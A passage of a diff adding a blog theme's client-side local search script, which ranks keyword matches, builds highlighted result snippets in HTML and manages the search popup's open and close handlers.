+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
 
 
 
